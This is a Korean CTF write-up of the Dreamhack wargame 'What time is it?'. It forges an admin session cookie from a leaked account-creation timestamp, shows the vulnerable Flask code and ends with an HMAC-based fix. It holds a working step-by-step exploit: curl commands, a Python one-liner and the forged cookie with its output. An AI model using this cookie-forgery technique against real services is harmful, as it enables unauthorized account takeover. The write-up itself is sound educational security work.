---
layout: post
title:  "Dreamhack 워게임 What time is it? 풀이 — 자작 세션 토큰의 단순함과 leak 된 timestamp 로 admin 위조"
date:   2026-05-19 20:30:00 +0900
categories: security web wargame dreamhack writeup flask session-forgery cryptography
---

## 들어가며

Dreamhack 웹해킹 워게임 **What time is it?** (난이도 별 1, 풀이자 409명) 풀이입니다. 제목과 이모지 🕑 만 봐도 정답이 보이는 솔직한 문제 — **세션 토큰이 사용자 생성 시각(unix timestamp) 을 그대로 곱하기 한 값**이고, 그 시각이 다른 페이지에서 그대로 노출됩니다. 세션 위조의 교과서 같은 예제.

문제 설명:

> admin으로 로그인 하여 FLAG를 획득하세요🕑

스포일러 결론:

```bash
SERVER="http://host8.dreamhack.games:PORT"

# 1) 아무 계정으로 가입 → /welcome 의 admin 생성시각을 본다
curl -c jar.txt -X POST "$SERVER/register" \
  --data-urlencode "username=tmp" --data-urlencode "password=tmp"
curl -b jar.txt "$SERVER/welcome"
# → "[19/05/2026, 02:39:24 UTC] admin님 환영합니다."

# 2) 그 날짜를 unix timestamp 로 환산, ×2026 해서 admin 세션 위조
python3 -c '
import datetime
ts = int(datetime.datetime(2026,5,19,2,39,24, tzinfo=datetime.timezone.utc).timestamp())
print(f"admin.{ts*2026}")
'
# → admin.3604574845464

# 3) 그 쿠키 그대로 / 에 가면 flag 가 박힌 홈페이지가 렌더링됨
curl "$SERVER/" -H "Cookie: session=admin.3604574845464"
# → ...<pre>DH{It_is_time_t0_s1eep~_~}</pre>
```

## 1. 자료 파악

ZIP 안에 Flask 두 파일과 템플릿 4장:

```
app.py
session.py        ← ★ 본체
flag.txt
Dockerfile
templates/{index,login,register,welcome}.html
```

`session.py` 가 핵심입니다:

```python
def make_session(username: str, created_at: int) -> str:
    return f"{username}.{created_at * 2026}"

def parse_session(value: str):
    if not value or "." not in value:
        return None
    username, token = value.split(".", 1)
    ...
    return username, token

def verify_session(value: str, created_at: int) -> str | None:
    parsed = parse_session(value)
    if not parsed: return None
    username, token = parsed
    return username if token == str(created_at * 2026) else None
```

- 토큰 = `username.<created_at * 2026>`
- 검증은 "DB 에 저장된 사용자의 created_at 에 2026 을 곱해서 토큰 뒷부분과 비교"

**시크릿 키가 없습니다**. HMAC 도 없고, salt 도 없고, 그냥 곱하기 2026. 이게 보안의 전부예요.

## 2. 1차 코드 리뷰 — 곱하기는 "암호화" 가 아니다

`make_session` 만 봐도 머릿속에서 빨간 등이 켜져야 합니다:

1. **단방향 변환이 아님**: 곱하기는 즉시 역연산(나누기) 가능. 토큰을 보면 created_at 을 알 수 있고, created_at 을 알면 토큰을 만들 수 있음.
2. **공통 비밀이 없음**: 두 함수 사이의 약속(=2026) 은 코드만 봐도 알 수 있음. 더 나쁜 건, 코드가 없어도 토큰 ↔ created_at 비율만 알면 됨.
3. **검증이 timestamp 대조에만 의존**: 즉 `(username, created_at)` 쌍을 알면 **그 사용자로 로그인할 수 있음**.

따라서 풀이 전략은: **"admin 의 created_at 을 알 수 있는가?"** 한 줄로 압축됩니다.

## 3. 어디서 timestamp 가 새는가 — `/welcome` 의 가입 피드

`app.py` 의 환영 페이지:

```python
@app.get("/welcome")
def welcome():
    ...
    for row in welcome_feed:
        e = row["created_at"]
        dt = datetime.fromtimestamp(e, tz=timezone.utc).strftime("%d/%m/%Y, %H:%M:%S UTC")
        feed.append({"username": row["username"], "created_at_str": dt})
    return render_template("welcome.html", username=uname, users=feed)
```

`welcome_feed` 는 `add_user` 가 호출될 때마다 `(username, created_at)` 쌍을 누적합니다. 그리고 앱 부팅 시 자동으로 admin 이 등록됩니다:

```python
if "admin" not in users:
    add_user("admin", "**REDACTED**", int(time.time()))
```

→ 즉 admin 의 `created_at` 은 **앱이 시작된 시각의 unix timestamp(초)**.
→ 그리고 `/welcome` 은 **모든 사용자(=admin 포함)의 created_at 을 UTC 날짜 문자열로 출력**.

**`int(time.time())` 으로 만들어진 초 단위 타임스탬프** 와 **`%S UTC` 까지 표시되는 포맷** 이 정확히 같은 해상도. 정밀도 손실이 0 입니다. 즉 우리는 admin 의 created_at 을 **로스리스** 로 복원할 수 있어요. 출제자가 의도적으로 정밀도를 맞춰둔 거죠.

> 비유: 회사 출입 카드를 "입사일 × 2026" 으로 발급해놓고, 사내 인트라넷의 "환영합니다" 게시판에 입사일을 분 단위로 띄워놓는 상황.

## 4. 익스플로잇

### 4.1 단계별

```bash
SERVER="http://host8.dreamhack.games:PORT"

# (1) 가입은 username/password 가 아무거나 OK — 단지 /welcome 에 접근하기 위한 세션 확보용
curl -c jar.txt -X POST "$SERVER/register" \
  --data-urlencode "username=tmp" --data-urlencode "password=tmp"

# (2) 환영 페이지에서 admin 라인을 찾는다
curl -b jar.txt "$SERVER/welcome"
#   <li>[19/05/2026, 02:39:24 UTC] admin님 환영합니다.</li>
#   <li>[19/05/2026, 02:39:40 UTC] tmp님 환영합니다.</li>

# (3) admin 의 날짜 → unix ts → ×2026 → 위조 쿠키
python3 -c '
import datetime
ts = int(datetime.datetime(2026,5,19,2,39,24, tzinfo=datetime.timezone.utc).timestamp())
print(f"admin.{ts*2026}")
'
# admin.3604574845464

# (4) 위조 쿠키로 / 접근 → flag 가 박힌 home 이 렌더링됨
curl -H "Cookie: session=admin.3604574845464" "$SERVER/"
#   <p>Hello, <b>admin</b>! / <a href="/welcome">welcome</a> ...
#   <pre>DH{It_is_time_t0_s1eep~_~}</pre>
```

### 4.2 단계별 검증

- `parse_session("admin.3604574845464")` → `("admin", "3604574845464")` ✓
- `users["admin"]["created_at"]` = 앱 시작 시각의 ts (위에서 본 19/05/2026 02:39:24)
- `str(ts * 2026)` = `"3604574845464"` ↔ 우리 토큰의 뒷부분 동일 ✓
- `verify_session` → `"admin"` 반환
- `current_user()` → `"admin"`
- `index` → `is_admin=True` → `<pre>{{ flag }}</pre>` 렌더링 ✓

## 5. 안전하게 고치기

세 가지 패치가 동시에 들어가야 합니다.

### 5.1 토큰을 "검증 가능 + 위조 불가" 로 만들기

```python
import hmac, hashlib, os, base64

SECRET = os.environ["SESSION_SECRET"].encode()  # 충분히 긴 임의 바이트

def make_session(username: str, created_at: int) -> str:
    payload = f"{username}.{created_at}".encode()
    sig = hmac.new(SECRET, payload, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(payload + b"." + sig).decode()

def verify_session(token: str):
    raw = base64.urlsafe_b64decode(token)
    payload, sig = raw.rsplit(b".", 1)
    expected = hmac.new(SECRET, payload, hashlib.sha256).digest()
    if not hmac.compare_digest(sig, expected):
        return None
    return payload.decode().split(".", 1)
```

`hmac.compare_digest` 는 **상수시간 비교** 라 timing attack 도 막힘.

### 5.2 admin 의 created_at 자체를 노출하지 말기

이 문제처럼 timestamp 가 인증의 일부라면, 그 timestamp 를 **공개 페이지에 띄우지 말 것**. 환영 피드가 정말 필요하다면 가입 순서만 보여주거나, admin 같은 특수 계정은 피드에서 제외.

### 5.3 Flask 가 이미 만들어둔 걸 쓰자

이런 코드를 직접 작성하는 대신 `flask.session` (signed cookie) 또는 `Flask-Login` 의 세션 매니저를 쓰면 99% 의 함정을 피할 수 있습니다. **세션 발급/검증은 직접 만들지 않는다** 가 일반 원칙.

## 6. 한 번 더 정리

### 6.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| `created_at * 2026` 토큰 | Weak/No Cryptography (CWE-327) | 비밀키 없는 가역 변환 |
| `/welcome` 에서 created_at 풀공개 | Information Exposure (CWE-200) | 인증 근거 데이터를 비인증 페이지에서 노출 |
| `int(time.time())` 정밀도 = 출력 정밀도 | Insufficient Resolution | 표시값에서 입력값 완전 복원 가능 |

### 6.2 입문자가 챙겨가면 좋은 시각

- **"내가 만든 인증 체계가 안전한가?" 의 첫 질문**: "이 토큰을 위조하기 위해 공격자가 알아야 하는 비밀이 무엇인가? 그 비밀은 외부에서 알 수 없는가?". 비밀이 없으면 인증 자체가 없는 것.
- **시간(time.time(), now(), uuid1, snowflake ID...) 은 비밀이 아니다**. 게다가 로그/피드/메타데이터로 새는 경우가 흔함.
- **수학적으로 역연산이 가능한 변환** (곱하기, 더하기, XOR with fixed key 등) 은 암호화가 아니라 단순 인코딩. 같은 키로 양방향이 가능하면 그건 그냥 base64 라고 생각하자.

## 7. 시도했지만 실패한 것들 (회고)

이번 회차는 별다른 헛수고 없이 5분 컷이었지만, "혹시 다른 우회 경로가 있나?" 잠깐 살펴본 두 가지를 적어둡니다.

### 7.1 /login 의 password 비교 → 그냥 평문 비교

`u["pw"] != pw` 평문 비교라 timing attack 가능성은 있지만, admin 의 password 는 `**REDACTED**` 라 코드만 봐도 길이/문자집합도 모름. **password 사이드 채널은 시간 손해 큰 길**.

### 7.2 username 충돌 / 빈 username 등 흔한 가입 트릭

`if username in users: return "Already exists"` 가 admin 도 차단. `username = "admin "` 처럼 공백 붙여서 `strip()` 우회? — `add_user(username.strip(), ...)` 가 strip 후 저장이 아니라 그냥 raw 저장이긴 한데, 어쨌든 `current_user()` 에서 `users.get(username)` 으로 다시 조회하기 때문에 우회한 정체성으로 admin 권한을 얻을 순 없음. **빠르게 포기**.

→ 결국 가장 직관적인 경로(timestamp leak) 가 정답이었습니다. **문제 제목이 정답을 가리키고 있을 때는 그냥 그 길로 가는 게 정답**이라는 교훈.

---

세션 토큰은 직접 만들지 마세요. 만들었으면 코드에 `hmac` 이 보이는지부터 확인하세요.
